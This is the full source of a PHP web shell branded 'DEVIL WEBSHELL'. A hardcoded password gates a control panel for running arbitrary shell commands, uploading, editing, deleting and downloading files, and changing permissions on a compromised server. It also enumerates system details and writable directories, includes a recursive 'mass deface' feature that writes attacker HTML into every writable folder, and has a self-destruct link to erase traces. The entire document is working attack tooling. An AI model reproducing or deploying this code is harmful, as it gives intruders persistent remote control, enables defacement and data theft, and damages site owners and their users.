<?php
session_start();
$password = "devil2025";


if (isset($_POST['pass'])) {
    if ($_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        $error = "WRONG PASSWORD!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['auth'])) {
    ?>
    <style>
        body {
            background: radial-gradient(circle at center, #1a0000 0%, #000 100%);
            color: red;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        form {
            background: #330000;
            padding: 30px;
            border: 2px solid red;
            border-radius: 10px;
            text-align: center;
            width: 300px;
        }
        input[type="password"] {
            width: 90%;
            padding: 10px;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 16px;
            margin-bottom: 20px;
            background: #220000;
            border: 1px solid red;
            color: red;
        }
        input[type="submit"] {
            background: red;
            color: black;
            font-weight: bold;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 16px;
            text-transform: uppercase;
        }
        .error {
            color: #ff5555;
            font-weight: bold;
            margin-bottom: 15px;
            text-transform: uppercase;
        }
    </style>
    <form method="POST">
        <h2>ENTER PASSWORD</h2>
        <?php if(isset($error)) echo "<div class='error'>$error</div>"; ?>
        <input type="password" name="pass" placeholder="PASSWORD" autofocus autocomplete="off" required />
        <br/>
        <input type="submit" value="LOGIN" />
    </form>
    <?php
    exit;
}




$scriptPath = dirname(realpath(__FILE__));


if (isset($_GET['path']) && !empty($_GET['path'])) {
    
    $requestedPath = $_GET['path'];
    
    
    if ($requestedPath[0] !== '/') {
        $currentPath = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $scriptPath;
        $requestedPath = realpath($currentPath.'/'.$requestedPath);
    } else {
        $requestedPath = realpath($requestedPath);
    }
    
    
    if ($requestedPath && is_dir($requestedPath) && is_readable($requestedPath)) {
        $_SESSION['current_path'] = $requestedPath;
        $path = $requestedPath;
    } else {
        $path = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $scriptPath;
        $msg = "INVALID PATH OR ACCESS DENIED: ".htmlspecialchars($_GET['path']);
    }
} else {
    $path = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $scriptPath;
}


function exec_cmd($cmd) {
    if (stripos(PHP_OS, 'win') === 0) {
        return shell_exec($cmd . " 2>&1");
    } else {
        return shell_exec($cmd . " 2>&1");
    }
}


if (isset($_FILES['upload'])) {
    $uploadfile = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadfile)) {
        $msg = "UPLOAD SUCCESSFUL";
    } else {
        $msg = "UPLOAD FAILED";
    }
}


if (isset($_GET['delete'])) {
    $fileToDelete = realpath($_GET['delete']);
    if ($fileToDelete && strpos($fileToDelete, $path) === 0 && is_file($fileToDelete)) {
        unlink($fileToDelete);
        header("Location: ".$_SERVER['PHP_SELF']."?path=".urlencode($path));
        exit;
    }
}


if (isset($_GET['download'])) {
    $fileToDownload = realpath($_GET['download']);
    if ($fileToDownload && strpos($fileToDownload, $path) === 0 && is_file($fileToDownload)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($fileToDownload).'"');
        header('Content-Length: ' . filesize($fileToDownload));
        readfile($fileToDownload);
        exit;
    }
}


if (isset($_POST['editfile']) && isset($_POST['filecontent'])) {
    $editFilePath = realpath($_POST['editfile']);
    if ($editFilePath && strpos($editFilePath, $path) === 0 && is_writable($editFilePath)) {
        file_put_contents($editFilePath, $_POST['filecontent']);
        $msg = "FILE SAVED SUCCESSFULLY";
    } else {
        $msg = "FAILED TO SAVE FILE";
    }
}


if (isset($_GET['selfdestruct']) && $_GET['selfdestruct'] === 'true') {
    unlink(__FILE__);
    exit("WEB SHELL DELETED.");
}


if (isset($_POST['chmodfile']) && isset($_POST['chmodperm'])) {
    $cf = realpath($path . DIRECTORY_SEPARATOR . $_POST['chmodfile']);
    if ($cf && strpos($cf, $path) === 0) {
        if (@chmod($cf, octdec($_POST['chmodperm']))) {
            $msg = "PERMISSIONS CHANGED SUCCESSFULLY";
        } else {
            $msg = "FAILED TO CHANGE PERMISSIONS";
        }
    } else {
        $msg = "FILE/DIR NOT FOUND OR ACCESS DENIED";
    }
}


if (isset($_POST['newfilename'])) {
    $newFile = $path . DIRECTORY_SEPARATOR . $_POST['newfilename'];
    if (!file_exists($newFile)) {
        if (touch($newFile)) {
            $msg = "FILE CREATED SUCCESSFULLY";
        } else {
            $msg = "FAILED TO CREATE FILE";
        }
    } else {
        $msg = "FILE ALREADY EXISTS";
    }
}


if (isset($_POST['newfoldername'])) {
    $newFolder = $path . DIRECTORY_SEPARATOR . $_POST['newfoldername'];
    if (!file_exists($newFolder)) {
        if (mkdir($newFolder)) {
            $msg = "FOLDER CREATED SUCCESSFULLY";
        } else {
            $msg = "FAILED TO CREATE FOLDER";
        }
    } else {
        $msg = "FOLDER ALREADY EXISTS";
    }
}


if (isset($_POST['renameold']) && isset($_POST['renamenew'])) {
    $oldPath = $path . DIRECTORY_SEPARATOR . $_POST['renameold'];
    $newPath = $path . DIRECTORY_SEPARATOR . $_POST['renamenew'];
    if (file_exists($oldPath) && !file_exists($newPath)) {
        if (rename($oldPath, $newPath)) {
            $msg = "RENAME SUCCESSFUL";
        } else {
            $msg = "RENAME FAILED";
        }
    } else {
        $msg = "FILE NOT FOUND OR NEW NAME ALREADY EXISTS";
    }
}


// Mass Deface
if (isset($_POST['deface_content']) && !empty($_POST['deface_content'])) {
    $defacePath = $_POST['deface_path'] ?: $path;
    $defaceContent = $_POST['deface_content'];
    $fileExtension = $_POST['deface_extension'];
    $fileName = $_POST['deface_filename'];
    $recursive = isset($_POST['recursive']);
    
    if (!realpath($defacePath)) {
        $defacePath = $path . DIRECTORY_SEPARATOR . $defacePath;
    }
    
    $defacePath = realpath($defacePath);
    
    if ($defacePath && is_dir($defacePath) && is_writable($defacePath)) {
        $createdFiles = 0;
        $failedFiles = 0;
        
        if ($recursive) {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($defacePath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            
            foreach ($iterator as $item) {
                if ($item->isDir() && is_writable($item->getPathname())) {
                    $targetFile = $item->getPathname() . DIRECTORY_SEPARATOR . $fileName . $fileExtension;
                    if (file_put_contents($targetFile, $defaceContent) !== false) {
                        $createdFiles++;
                    } else {
                        $failedFiles++;
                    }
                }
            }
        } else {
            // Current directory only
            $targetFile = $defacePath . DIRECTORY_SEPARATOR . $fileName . $fileExtension;
            if (file_put_contents($targetFile, $defaceContent) !== false) {
                $createdFiles++;
            } else {
                $failedFiles++;
            }
        }
        
        $msg = "MASS DEFACE COMPLETED: $createdFiles files created, $failedFiles failed";
    } else {
        $msg = "INVALID PATH OR PERMISSION DENIED FOR MASS DEFACE";
    }
}


if (isset($_POST['searchterm'])) {
    $searchTerm = $_POST['searchterm'];
    $searchResults = [];
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
    foreach ($iterator as $file) {
        if ($file->isDir()) continue;
        if (stripos($file->getFilename(), $searchTerm) !== false) {
            $searchResults[] = $file->getPathname();
        }
    }
}


$files = scandir($path);

function human_filesize($bytes, $decimals = 2) {
    $sizes = array('B','KB','MB','GB','TB');
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$sizes[$factor];
}


$serverInfo = [
    'OS' => php_uname(),
    'PHP Version' => phpversion(),
    'Server IP' => $_SERVER['SERVER_ADDR'],
    'Client IP' => $_SERVER['REMOTE_ADDR'],
    'Server Software' => $_SERVER['SERVER_SOFTWARE'],
    'Current User' => get_current_user(),
    'Disk Usage' => disk_free_space($path) . ' free of ' . disk_total_space($path),
    'Current Path' => $path
];


$writableDirs = [];
$checkDirs = ['/', '/tmp', '/var/www', $path, '/home'];
foreach ($checkDirs as $dir) {
    if (is_dir($dir) && is_writable($dir)) {
        $writableDirs[] = $dir;
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>DEVIL WEBSHELL</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
    body {
        margin:0; padding:0; background: radial-gradient(circle at center, #4b0000 0%, #000 100%);
        font-family: 'Orbitron', monospace;
        color: #ff2a2a;
        user-select:none;
    }
    h1, h2, h3 {
        text-transform: uppercase;
        letter-spacing: 2px;
        text-align:center;
        margin: 10px 0;
    }
    .container {
        max-width: 1100px;
        margin: 0 auto;
        padding: 15px;
    }
    .msg {
        background: #660000;
        padding: 10px;
        margin: 10px 0;
        border: 1px solid #ff0000;
        text-align: center;
        font-weight: bold;
        text-transform: uppercase;
    }
    a {
        color: #ff4444;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 15px;
        box-shadow: 0 0 10px 2px #a30000;
    }
    th, td {
        border: 1px solid #ff0000;
        padding: 8px 12px;
        text-transform: uppercase;
        font-size: 13px;
        text-align: left;
        color: #ff9999;
    }
    th {
        background: #330000;
    }
    tr:nth-child(even) {
        background: #2a0000;
    }
    input[type=text], textarea {
        width: 100%;
        background: #1b0000;
        border: 1px solid #ff0000;
        color: #ff6666;
        text-transform: uppercase;
        font-family: 'Orbitron', monospace;
        font-weight: bold;
        font-size: 14px;
        padding: 8px;
        resize: vertical;
    }
    textarea {
        height: 250px;
    }
    input[type=submit], button {
        background: #ff0000;
        border: none;
        color: black;
        font-weight: bold;
        padding: 10px 20px;
        margin: 5px 0;
        cursor: pointer;
        text-transform: uppercase;
        font-size: 15px;
        border-radius: 3px;
        box-shadow: 0 0 8px #ff0000;
    }
    input[type=submit]:hover, button:hover {
        background: #cc0000;
        box-shadow: 0 0 12px #ff5555;
    }
    .header, .footer {
        background: #3a0000;
        padding: 10px;
        text-align: center;
        font-weight: 700;
        font-size: 18px;
        color: #ff0000;
        text-shadow: 0 0 10px #ff0000;
        letter-spacing: 3px;
    }
    .path {
        background: #220000;
        padding: 8px;
        margin-bottom: 10px;
        border: 1px solid #ff0000;
        font-weight: bold;
        letter-spacing: 1px;
    }
    .features {
        margin-top: 25px;
    }
    .feature-box {
        background: #330000;
        padding: 15px;
        margin-bottom: 25px;
        border: 1px solid #ff0000;
        box-shadow: 0 0 10px #ff0000;
    }
    .nav-links {
        margin-bottom: 20px;
        text-align: center;
    }
    .nav-links a {
        margin: 0 15px;
        font-weight: bold;
        font-size: 14px;
    }
    .btn-danger {
        background: #7f0000;
        box-shadow: 0 0 10px #7f0000;
    }
    .btn-danger:hover {
        background: #b30000;
        box-shadow: 0 0 15px #ff0000;
    }
    .path-input {
        width: 70% !important;
        display: inline-block;
    }
    .path-submit {
        width: 25% !important;
        display: inline-block;
    }
    .search-results {
        max-height: 200px;
        overflow-y: auto;
        border: 1px solid #ff0000;
        padding: 10px;
        margin-top: 10px;
        background: #220000;
    }
    .quick-nav {
        margin-top: 10px;
        padding: 8px;
        background: #220000;
        border: 1px solid #ff0000;
    }
    .quick-nav a {
        margin: 0 8px;
        font-size: 12px;
    }
    pre {
        background: #220000;
        padding: 10px;
        border: 1px solid #ff0000;
        color: #ff5555;
        font-family: 'Courier New', monospace;
        overflow-x: auto;
    }
    .glow {
        animation: glow 2s ease-in-out infinite alternate;
    }
    @keyframes glow {
        from {
            text-shadow: 0 0 5px #ff0000, 0 0 10px #ff0000;
        }
        to {
            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000;
        }
    }
</style>
</head>
<body>

<div class="header glow">DEVIL WEBSHELL CONTROL PANEL</div>

<div class="container">

    <?php if(isset($msg)) echo "<div class='msg'>$msg</div>"; ?>

   
    <div class="feature-box">
        <h2>CURRENT PATH</h2>
        <form method="GET">
            <input type="text" class="path-input" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" class="path-submit" value="GO" />
        </form>
        <div class="quick-nav">
            <strong>QUICK NAV:</strong>
            <a href="?path=/">ROOT</a> | 
            <a href="?path=/home">HOME</a> | 
            <a href="?path=/var/www">WWW</a> | 
            <a href="?path=/tmp">TEMP</a> |
            <a href="?path=<?php echo urlencode($scriptPath); ?>">SCRIPT</a>
        </div>
    </div>

    <div class="nav-links">
        <a href="?logout=1">LOGOUT</a> |
        <a href="?path=<?php echo urlencode($scriptPath); ?>">HOME</a> |
        <a href="?selfdestruct=true" onclick="return confirm('ARE YOU SURE TO SELF DESTRUCT? THIS WILL DELETE THE SHELL!');">SELF DESTRUCT</a>
    </div>

   
    <div class="feature-box">
        <h2>FILE BROWSER</h2>
        <table>
            <thead>
                <tr>
                    <th>NAME</th>
                    <th>SIZE</th>
                    <th>PERMISSIONS</th>
                    <th>MODIFIED</th>
                    <th>ACTIONS</th>
                </tr>
            </thead>
            <tbody>
            <?php
            foreach ($files as $file) {
                if ($file === '.') continue;
                $fullPath = $path . DIRECTORY_SEPARATOR . $file;
                $isDir = is_dir($fullPath);
                $size = $isDir ? '-' : human_filesize(filesize($fullPath));
                $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
                $modified = date("Y-m-d H:i:s", filemtime($fullPath));
                
                echo "<tr>";
                if ($file === '..') {
                    $parent = dirname($path);
                    echo "<td><a href='?path=".urlencode($parent)."'><strong>.. (PARENT)</strong></a></td>";
                } else {
                    if ($isDir) {
                        echo "<td><a href='?path=".urlencode($fullPath)."'><strong>$file/</strong></a></td>";
                    } else {
                        echo "<td>$file</td>";
                    }
                }
                echo "<td>$size</td>";
                echo "<td>$perms</td>";
                echo "<td>$modified</td>";
                echo "<td>";
                if ($file !== '..' && !$isDir) {
                    echo "<a href='?download=".urlencode($fullPath)."&path=".urlencode($path)."'>DOWNLOAD</a> | ";
                    echo "<a href='?edit=".urlencode($fullPath)."&path=".urlencode($path)."'>EDIT</a> | ";
                }
                if ($file !== '..') {
                    echo "<a href='?delete=".urlencode($fullPath)."&path=".urlencode($path)."' onclick='return confirm(\"DELETE $file ?\");' class='btn-danger'>DELETE</a>";
                }
                echo "</td>";
                echo "</tr>";
            }
            ?>
            </tbody>
        </table>
    </div>

   
    <div class="feature-box">
        <h2>FILE OPERATIONS</h2>
        
      
        <h3>UPLOAD FILE</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="upload" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="UPLOAD" />
        </form>
        
        
        <h3>CREATE NEW FILE</h3>
        <form method="POST">
            <input type="text" name="newfilename" placeholder="FILENAME" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="CREATE FILE" />
        </form>
        
        
        <h3>CREATE NEW FOLDER</h3>
        <form method="POST">
            <input type="text" name="newfoldername" placeholder="FOLDER NAME" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="CREATE FOLDER" />
        </form>
        
       
        <h3>RENAME FILE/FOLDER</h3>
        <form method="POST">
            <input type="text" name="renameold" placeholder="CURRENT NAME" required />
            <input type="text" name="renamenew" placeholder="NEW NAME" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="RENAME" />
        </form>
        
        <!-- MASS DEFACE FEATURE -->
        <h3>MASS DEFACE</h3>
        <form method="POST">
            <input type="text" name="deface_path" placeholder="TARGET PATH (leave empty for current)" />
            <textarea name="deface_content" placeholder="DEFACE CONTENT (HTML code)" rows="5"></textarea>
            <input type="text" name="deface_extension" placeholder="FILE EXTENSION (e.g. .html)" value=".html" required />
            <input type="text" name="deface_filename" placeholder="FILENAME (e.g. index)" value="index" required />
            <br/>
            <label><input type="checkbox" name="recursive" value="1" checked /> RECURSIVE (all subdirectories)</label>
            <br/>
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="MASS DEFACE" class="btn-danger" onclick="return confirm('WARNING: This will overwrite files! Continue?');" />
        </form>
    </div>

    
    <div class="feature-box">
        <h2>SEARCH FILES</h2>
        <form method="POST">
            <input type="text" name="searchterm" placeholder="SEARCH TERM" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="SEARCH" />
        </form>
        <?php if(isset($searchResults)): ?>
            <div class="search-results">
                <h3>SEARCH RESULTS</h3>
                <?php if(empty($searchResults)): ?>
                    <p>NO FILES FOUND</p>
                <?php else: ?>
                    <ul>
                        <?php foreach($searchResults as $result): ?>
                            <li><?php echo htmlspecialchars($result); ?></li>
                        <?php endforeach; ?>
                    </ul>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    </div>

<?php

if (isset($_GET['edit'])) {
    $editFile = realpath($_GET['edit']);
    if ($editFile && strpos($editFile, $path) === 0 && is_file($editFile) && is_readable($editFile)) {
        $content = htmlspecialchars(file_get_contents($editFile));
        ?>
        <div class="feature-box">
            <h2>EDIT FILE: <?php echo basename($editFile); ?></h2>
            <form method="POST">
                <textarea name="filecontent"><?php echo $content; ?></textarea>
                <input type="hidden" name="editfile" value="<?php echo htmlspecialchars($editFile); ?>" />
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
                <input type="submit" value="SAVE FILE" />
            </form>
        </div>
        <?php
    } else {
        echo "<div class='msg'>FAILED TO OPEN FILE FOR EDITING</div>";
    }
}
?>

   
    <div class="feature-box">
        <h2>CHANGE FILE PERMISSIONS (CHMOD)</h2>
        <form method="POST">
            <input type="text" name="chmodfile" placeholder="FILENAME" required />
            <input type="text" name="chmodperm" placeholder="PERMISSIONS (e.g. 0755)" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="CHANGE PERMISSIONS" />
        </form>
    </div>

   
    <div class="feature-box">
        <h2>EXECUTE COMMAND</h2>
        <form method="POST">
            <input type="text" name="cmd" placeholder="COMMAND" style="width:90%" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="EXECUTE" />
        </form>
        <pre><?php
if (isset($_POST['cmd'])) {
    echo htmlspecialchars(exec_cmd($_POST['cmd']));
}
?></pre>
    </div>

    
    <div class="feature-box">
        <h2>PHP INFO</h2>
        <form method="POST">
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" name="phpinfo" value="SHOW PHP INFO" />
        </form>
        <div style="background:#220000; padding:10px; margin-top:10px; max-height:300px; overflow:auto; color:#ff4444;">
        <?php
        if (isset($_POST['phpinfo'])) {
            ob_start();
            phpinfo();
            $phpinfo = ob_get_clean();
            echo preg_replace('/<style.*?<\/style>/s', '', $phpinfo);
        }
        ?>
        </div>
    </div>

    
    <div class="feature-box">
        <h2>SYSTEM INFORMATION</h2>
        <table>
            <?php foreach($serverInfo as $key => $value): ?>
                <tr>
                    <th><?php echo $key; ?></th>
                    <td><?php echo htmlspecialchars($value); ?></td>
                </tr>
            <?php endforeach; ?>
        </table>
    </div>

    
    <div class="feature-box">
        <h2>WRITABLE DIRECTORIES</h2>
        <?php if(empty($writableDirs)): ?>
            <p>NO WRITABLE DIRECTORIES FOUND</p>
        <?php else: ?>
            <ul>
                <?php foreach($writableDirs as $dir): ?>
                    <li><?php echo htmlspecialchars($dir); ?></li>
                <?php endforeach; ?>
            </ul>
        <?php endif; ?>
    </div>

    
    <div class="feature-box">
        <h2>DISK USAGE</h2>
        <pre><?php echo htmlspecialchars(exec_cmd("df -h")); ?></pre>
    </div>

</div>

<div class="footer glow">DEVIL WEBSHELL - CREATED BY Nostra</div>

</body>
</html>
